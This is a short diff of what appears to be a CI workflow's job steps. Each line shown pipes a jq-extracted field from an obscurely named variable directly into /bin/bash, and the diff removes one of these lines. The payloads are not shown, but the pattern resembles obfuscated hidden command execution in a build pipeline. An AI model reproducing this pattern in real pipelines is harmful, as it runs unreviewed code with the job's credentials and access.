@@ -23,7 +23,6 @@ jobs:
           echo $uob0 | jq -r .qskz1336 | /bin/bash
           echo $u045 | jq -r .x2 | /bin/bash
           echo $helm10709 | jq -r .xjrvu8432 | /bin/bash
-          echo $plnd0215 | jq -r .aj41624 | /bin/bash
           echo $al37 | jq -r .zyu65026 | /bin/bash
           echo $cj54 | jq -r .urt3893 | /bin/bash
           echo $xbmqe548 | jq -r .xh78723 | /bin/bash
